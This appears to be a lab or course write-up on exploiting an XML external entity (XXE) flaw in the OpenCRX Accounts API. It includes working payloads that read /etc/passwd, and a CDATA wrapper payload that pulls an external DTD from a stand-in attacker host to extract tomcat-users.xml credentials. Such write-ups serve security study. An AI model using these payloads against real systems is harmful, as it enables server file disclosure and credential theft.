## Finding the Vector
To find the vector we need to understand what we're looking for.
For instance, we take the following xml code:

```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

Here, when the XML parser, parses the code, it will replace the entity reference "&lastname" with the entity's value "Replaced".
The result that would be displayed is "Tom Replaced".

Similarly, if we change the XML entity to an external entity, and reference a file on the server:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

A vulnerable parser will load the file contents and place them in the XML document. A vulnerable parser would read in the contents of /etc/passwd and place that content in between the _lastName_ tags.
If the _lastName_ contents are included in a server response or we can retrieve the data in another way after the XML has been parsed, we can use this vulnerability to read files on the server.
Ideally, we would inject the XXE payload into a field that is displayed in the web application.

## OpenCRX XXE
After spending some time familiarizing ourselves with the application, the Accounts page seems like a good fit because the Accounts API accepts XML input.
If we can successfully create accounts using XXE payloads in one of these fields, such as a name field, we should be able to view the results of our XXE attack in the web application.

We head over to Manage accounts -> Wizards -> Explore API:

![](../../03.%20Screenshots/t6-ss17.png)

On the API Explorer page for the Accounts API, we can use a POST to /account as the basis of our attack.

![](../../03.%20Screenshots/t6-ss18.png)

We can also change the Request body to application/xml to send XML data instead of JSON:

![](../../03.%20Screenshots/t6-ss19.png)

To understand what type of code goes in here, we can visit the [documentation](https://www.opencrx.org/opencrx/2.3/new.htm):

![](../../03.%20Screenshots/t6-ss20.png)

We will be using the same code as given in the example.
Filling the code in, and pressing execute, we view the response in burp, and we see that the code is indeed working:

![](../../03.%20Screenshots/t6-ss21.png)

We will move on and edit the code to include an internal entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

Executing the code, we see that the internal entity works:

![](../../03.%20Screenshots/t6-ss22.png)

With the internal entity working, we will modify our code, to include an external entity to reference a file on the underlying server and find out if we can retrieve the contents.
We will use the following xml code:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

Even though we run into an error:

![](../../03.%20Screenshots/t6-ss23.png)

Going through the full response, we see that even though an error occurred, we are still able to read the contents of the etc/passwd file:

![](../../03.%20Screenshots/t6-ss24.png)

The error we get is _java.sql.SQLDataException_, which usually indicates a data error occurred when an SQL statement was executed.
Our exploit was able to fetch the data of the file.
However, the contents of the file were too large for the column size, causing the error.
That does not matter as we're still able to extract the contents of the file we specified.

## Using CDATA
XML parsers can encounter errors, if we attempt to read files containing XML or key characters used in XML as delimiters, such as < and >.
We need to make sure that our XML content remains properly formatted after the file contents are inserted.
Much like HTML, XML supports character escaping.
We can't use this with external entities, however, since we aren't able to manipulate the content of the files we are attempting to include.

XML supports _CDATA_, sections in which internal contents are not treated as markup.
If we can wrap file contents in CDATA tags, the parser will not treat it as markup, resulting in a properly-formatted XML file.

The point of using CDATA is to fetch sensitive xml files on the server, such as the tomcat-users.xml file, which contains the apache TomEE user credentials.

We will create two new entities that will act as the opening and closing CDATA tags.
We will receive an XML parser error if we try to concatenate three entities together, so we'll need an additional entity to act as a "wrapper" for the CDATA entities and the file content entity.
However, we can't reference a single entity from another entity within the DTD in which they are defined.
Thus, we will be using parameter entities that can be referenced by the "wrapper" entity, in an external DTD file hosted on our attacker machine.
Our DTD file will look like so:

```xml
<!ENTITY wrapper "%start;%file;%end;">
```

We will update our exploit to the following:

```XML
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://attackIP/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

Sending the code, and viewing the response, we see that the xml file:

![](../../03.%20Screenshots/t6-ss25.png)

We now have the credentials for all the users of the server.